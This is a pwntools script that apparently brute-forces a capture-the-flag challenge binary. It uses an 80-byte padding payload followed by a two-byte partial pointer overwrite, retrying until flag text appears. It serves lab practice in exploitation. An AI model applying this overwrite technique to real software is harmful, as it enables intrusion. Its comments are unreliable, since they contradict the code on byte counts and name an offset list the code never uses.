from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def try_exploit():
    attempt = 0
    while True:
        try:
            print(f"Attempt {attempt}...")
            p = process("/challenge/pointer-problems-hard")
            
            # Wait for the "Payload size:" prompt
            p.recvuntil(b"Payload size:")
            
            # Send the size first - we need 88 bytes to reach the pointer
            p.sendline(b"82")
            
            # Now wait for the payload prompt
            p.recvuntil(b"Send your payload (up to 82 bytes)!")
            
            # Try different offsets - we want to point to start of bss instead of bss+358
            # Common offsets to try (little-endian)
            offsets = [
                b'\x40\xc0',  # Most likely - direct calculation
                b'\x00\xc0',  # Alternative
                b'\x40\x00',  # Another try
                b'\x00\x00',  # Null bytes
                b'\x3a\xc0',  # -366
                b'\x46\xc0',  # -350
            ]
            
            #current_offset = offsets[attempt % len(offsets)]
            
            # 80 bytes padding + 8 bytes pointer overwrite
            payload = b'A' * 80 + b'\x40\xc0'
            p.sendline(payload)
            
            # Get all output
            output = p.recvall(timeout=1).decode()
            p.close()
            
            # Check for flag patterns
            if any(pattern in output for pattern in ['pwn', 'flag', '{', 'FLAG', 'CTF']):
                print(f"\n[SUCCESS] Found flag on attempt {attempt}!")
                print("="*60)
                print(output)
                print("="*60)
                break
                
            attempt += 1
            
        except Exception as e:
            print(f"Attempt {attempt} failed: {e}")
            attempt += 1
            continue

if __name__ == "__main__":
    try_exploit()
